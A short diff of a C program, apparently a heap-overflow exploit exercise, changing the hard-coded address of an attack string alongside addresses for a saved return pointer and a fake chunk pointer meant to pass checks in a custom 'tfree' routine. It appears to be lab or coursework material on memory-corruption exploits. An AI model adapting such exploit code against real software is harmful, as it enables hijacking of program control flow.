@@ -26,7 +26,7 @@ int main(void)
 
     addr_ptr = (long *)attack_string;
     char_ptr = attack_string;
-    chunk_left  = 0x8049a88;            // Address of our attack string
+    chunk_left  = 0x8049a48;            // Address of our attack string
     chunk_right = 0xbffff60c;           // Address of the saved eip
     fake_right  = 0x87654321;           // fake address that passes the conditions in tfree
 
